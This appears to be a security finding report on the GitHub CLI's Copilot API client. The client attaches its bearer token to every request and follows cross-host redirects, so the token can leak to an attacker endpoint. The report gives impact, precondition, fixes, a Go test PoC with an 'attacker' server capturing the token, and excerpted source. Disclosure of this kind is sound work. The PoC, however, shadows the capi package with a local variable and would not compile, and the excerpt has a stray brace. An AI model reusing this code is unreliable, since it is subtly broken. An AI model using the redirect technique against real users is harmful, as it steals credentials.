### Title
CAPI HTTP client lacks a redirect policy, allowing the Copilot bearer token to be forwarded on cross-host redirects - ([File: pkg/cmd/agent-task/capi/client.go])

### Finding Description
`NewCAPIClient` only mutates `httpClient.Transport`, wrapping it with `capiTransport` which unconditionally sets `req.Header.Set("Authorization", "Bearer "+ct.token)` on every request passed to `RoundTrip`, regardless of the request's destination host. [1](#0-0)  No `http.Client.CheckRedirect` is set on `c.httpClient` in `NewCAPIClient`, in `CapiClientFunc`, or anywhere in the `shared/capi.go` construction chain. [2](#0-1)  A repo-wide search confirms `CheckRedirect` is never referenced in the agent-task/capi code paths. 

Because Go's `net/http.Client.Do` uses the default redirect policy when `CheckRedirect` is nil (follow up to 10 redirects, and Go's client creates a fresh request for each hop then calls `RoundTrip` again), every hop passes back through `capiTransport.RoundTrip`, which re-adds the `Authorization: Bearer <token>` header without any check on `req.URL.Host`. This is exercised in `ListLatestSessionsForViewer` and `GetSession`, both of which call `c.httpClient.Do(req)` directly against a URL built from `c.capiBaseURL`. [3](#0-2) [4](#0-3) 

The `capiBaseURL` used to build these requests originates from `resolveCapiURL`, which trusts the `viewer.copilotEndpoints.api` field returned by a GraphQL query against the configured GitHub host. [5](#0-4)  Per this question's stated precondition, an attacker who can influence the response from the resolved CAPI host (e.g., via the host-confusion issue referenced as "question 8," or a compromised/attacker-controlled proxy sitting between the client and that host) can respond to any CAPI request with a `3xx` and a `Location` header pointing at an attacker-controlled endpoint. The client's default redirect-following behavior, combined with the header-setting `RoundTrip` never checking the target host, will forward `Authorization: Bearer <token>` to that attacker endpoint.

### Impact Explanation
This is a token-exfiltration primitive: an attacker who can produce a response for the Copilot API host consumed by `gh` can steal the user's Copilot/GitHub bearer token via a same-origin-looking redirect, which is then followed cross-host with the credential attached. This maps to GitHub's "sensitive credential disclosure" bounty impact class. It is scoped only to the credential-confinement invariant here — it is not independently exploitable without the attacker already controlling a response from the resolved CAPI host (i.e., it compounds an existing host-confusion/MITM-style precondition rather than being reachable from purely public inputs like a repo/PR/issue).

### Likelihood Explanation
Exploitability strictly requires the stated precondition — attacker control of a response from the already-resolved `capiBaseURL` host (via the host-confusion in "question 8" or a compromised proxy). Given that precondition, the exploit is trivial and fully reliable: standard Go `net/http` redirect-following plus unconditional header injection in `RoundTrip` guarantees the token is attached to every hop, with no host-scoping check anywhere in the call path. Without that precondition (i.e., if the attacker cannot influence the CAPI host's response at all), this alone is not independently reachable by an unprivileged remote GitHub content publisher.

### Recommendation
- Set an explicit `CheckRedirect` function on the `http.Client` used by `CAPIClient` (in `NewCAPIClient`) that rejects or strips the `Authorization` header whenever the redirect target's host differs from `capiHost` (mirroring the pattern Go's own `http.Client` uses for `Authorization` header stripping on cross-origin redirects, similar to what's already done for `pkg/cmd/release/download/download.go` and `pkg/cmd/repo/delete/http.go`, which do set `CheckRedirect`).
- Alternatively/additionally, in `capiTransport.RoundTrip`, only add the `Authorization` header when `req.URL.Host == ct.capiHost`, rather than unconditionally, since it is currently only conditionally guarding `Copilot-Integration-Id` and `X-GitHub-Api-Version` but not `Authorization`.

### Proof of Concept
```go
func TestCAPIClient_TokenNotForwardedCrossHostOnRedirect(t *testing.T) {
    var gotAuth string
    attacker := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        gotAuth = r.Header.Get("Authorization")
        w.WriteHeader(http.StatusOK)
    }))
    defer attacker.Close()

    capi := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        http.Redirect(w, r, attacker.URL+"/agents/sessions", http.StatusFound)
    }))
    defer capi.Close()

    client := capi.NewCAPIClient(&http.Client{}, "secret-token", "github.com", capi.URL)
    _, _ = client.(*capi.CAPIClient).GetSession(context.Background(), "00000000-0000-0000-0000-000000000000")

    if gotAuth != "" {
        t.Fatalf("expected Authorization header to be stripped on cross-host redirect, got %q", gotAuth)
    }
}
```
Expected (current) result: `gotAuth == "Bearer secret-token"`, demonstrating the token leaks to the attacker-controlled host — confirming the missing `CheckRedirect`/host-scoping safeguard.

// capiTransport adds the Copilot auth headers
type capiTransport struct {
	rp       http.RoundTripper
	token    string
	capiHost string
}

func newCAPITransport(token string, capiBaseURL string, rp http.RoundTripper) *capiTransport {
	capiHost := ""
	if u, err := url.Parse(capiBaseURL); err == nil {
		capiHost = u.Host
	}
	return &capiTransport{
		rp:       rp,
		token:    token,
		capiHost: capiHost,
	}
}

func (ct *capiTransport) RoundTrip(req *http.Request) (*http.Response, error) {
	req.Header.Set("Authorization", "Bearer "+ct.token)

	// Since this RoundTrip is reused for both Copilot API and
	// GitHub API requests, we conditionally add the integration
	// ID only when performing requests to the Copilot API.
	if req.URL.Host == ct.capiHost {
		req.Header.Add("Copilot-Integration-Id", "copilot-4-cli")

		// Ensure we are not using GitHub API versions while targeting CAPI.
		req.Header.Set("X-GitHub-Api-Version", "2026-01-09")
	}
	return ct.rp.RoundTrip(req)

	}

// resolveCapiURL queries the GitHub API for the Copilot API endpoint URL.
func resolveCapiURL(httpClient *http.Client, host string) (string, error) {
	apiClient := api.NewClientFromHTTP(httpClient)

	var resp struct {
		Viewer struct {
			CopilotEndpoints struct {
				Api string `graphql:"api"`
			} `graphql:"copilotEndpoints"`
		} `graphql:"viewer"`
	}

	if err := apiClient.Query(host, "CopilotEndpoints", &resp, nil); err != nil {
		return "", err
	}

	if resp.Viewer.CopilotEndpoints.Api == "" {
		return "", errors.New("empty Copilot API URL returned")
	}

	return resp.Viewer.CopilotEndpoints.Api, nil
}
